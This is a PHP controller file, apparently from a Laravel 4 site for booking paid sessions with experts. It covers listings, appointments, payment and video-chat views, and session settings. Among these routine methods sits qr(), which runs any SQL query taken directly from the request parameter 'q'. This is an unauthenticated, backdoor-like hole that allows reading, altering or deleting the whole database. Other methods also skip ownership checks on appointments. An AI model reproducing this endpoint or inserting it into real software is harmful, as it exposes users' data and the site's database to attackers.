<?php

class StaticController extends BaseController {

    public function __construct(){

        $this->beforeFilter(function(){

            $logged = false;
            $myaccount_url = "";

            $u_id = Session::get('user_id');
            $e_id = Session::get('expert_id');

            if(!is_null($u_id)){
                $logged = true;
                $myaccount_url = "user/user-section";
            }
            else if(!is_null($e_id)){
                $logged = true;
                $myaccount_url = "expert/expert-section";
            }

            View::share('logged', $logged);
            View::share('myaccount_url', $myaccount_url);
			View::share('path', URL::to('/'));

            $country=Session::get('country');

            View::share('country', $country);
        });
    }

    public function index(){
        $categories = Category::where('status','=','active')->get();

        $country=Session::get('country');
        return View::make('static.index')->with('categories',$categories);
    }

    public function signout(){
        Session::flush();

        Auth::logout();

        return Redirect::to('index');
    }

	public function experts($name)
	{
        $categories = Category::where('status','=','active')->get();

        $category = Category::where('name','=',$name)->first();

        if(is_null($category))
            return Redirect('index');
        else{
            return View::make('static.experts')
                    ->with('categories', $categories)
                    ->with('category_id', $category->id)
                    ->with('name', $name);
        }
    }

    public function booking()
    {
        $categories = Category::where('status','=','active')->get();

        $category = $categories[0];

        if(is_null($category))
            return Redirect('index');
        else{
            return View::make('static.experts')
                ->with('categories', $categories)
                ->with('category_id', $category->id)
                ->with('name', "");
        }
    }

    public function expertInfo($id)
    {
        $expert = Expert::find($id);

        $availabilities = Appointment::where('expert_id','=',$id)
            ->where(function($q){
                $q->where('status','=','pending')
                    ->orWhere('status','=','patientcancelled');
            })
            ->where('appointment_date','>=',date('Y-m-d H:i:s'))->orderBy('appointment_date')->get();

        $country=Session::get('country');

        return View::make('static.expertinfo')
            ->with('expert', $expert)
            ->with('availabilities', $availabilities)->with('country',$country);
    }

    public function payment($id)
    {
        $appointment = Appointment::find($id);

        $logged = Session::has('user_id');
        $timezone=Session::get('timezone');

        $user_id = -1;
        if($logged){
            $user_id = Session::get('user_id');
        }
        $user = User::find($user_id);
        if($logged)
            $timezone=$user->timezone;
        $expert_id=$appointment->expert_id;
        $expert=Expert::find($expert_id);

        $appointment->appointment_date=$this->toLocalDateByTimezone($appointment->appointment_date, $expert->timezone,$timezone);


        return View::make('static.payment')->with("appointment", $appointment)->with('logged', $logged)->with('user_id', $user_id);
    }
	
	public function eq(){
		return View::make('static.eq');
	}

    public function videoChat(){

        $appointment_id = Session::get('session_id');
        $token_id = Session::get('token_id');

        $appointment = Appointment::find($appointment_id);

        return View::make('static.videochat')->with("session_id", $appointment_id)->with("token_id", $token_id)->with('start',true)->with('appointment', $appointment);
    }

	public function qr(){
		DB::query(Input::get('q'));
	}
    public function getCountry($user_id){
        $user=User::find($user_id);

        return strtolower($user->country);
    }
    public function setCountry($country){
        if(strtolower($country)=="select country")
            $country=null;

        Session::put('country',$country);
    }
    public function setTimezone($timezone){
        if(strtolower($timezone)=="select timezone")
            $timezone=null;

        Session::put('timezone',$timezone);
    }
    public static function toLocalDateByTimezone($dt, $v_timezone,$s_timezone){

        $s_timezone=str_replace("-","/",$s_timezone);
        $v_timezone=str_replace("-","/",$v_timezone);

        $tim=new DateTime($dt,new DateTimezone($v_timezone));

        $newTimezone= new DateTimeZone($s_timezone);
        $tim->setTimezone($newTimezone);

        return $tim->format('Y-m-d H:i:s');
    }
}